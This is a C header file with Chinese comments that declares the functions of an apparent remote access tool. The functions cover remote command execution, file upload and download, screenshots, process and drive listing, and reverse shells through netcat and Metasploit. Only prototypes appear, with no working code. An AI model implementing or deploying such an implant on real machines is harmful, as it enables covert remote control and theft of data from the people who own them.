#pragma once
#include "socket.h"

/**
 *
 * 命令执行相关的操作
 * 麦当
 * 2022/3/8
 *
**/


// 接收cmd命令执行后的结果
void RecvCmdResult(SOCKET sServer);
// 获取路径
void RecvPath(SOCKET sServer);
// 获取时间戳
void GetTimestamp(char time[]);
// 执行命令
void ExecCmd(SOCKET sServer, char cmd[]);
// 下载文件
BOOL Download(SOCKET sServer, char cmd[]);
// 上传文件
BOOL Upload(SOCKET sServer, char cmd[]);
// 切换路径
BOOL ChangePath(char cmd[]);
// 反弹NC
BOOL NC(SOCKET sServer, char cmd[]);
// 截屏命令
BOOL Screen(SOCKET sServer, char cmd[]);
// 查看进程信息命令
BOOL PS(SOCKET sServer, char cmd[]);
// 磁盘命令
BOOL Drive(SOCKET sServer, char cmd[]);
// 反弹msf
BOOL MSF(SOCKET sServer, char cmd[]);
// 获取pid
BOOL GetPID(SOCKET sServer, char cmd[]);
// 帮助菜单
BOOL Help(char cmd[]);
// TCHAR转CHAR *
void TcharToStr(const TCHAR* tchar, char* _char);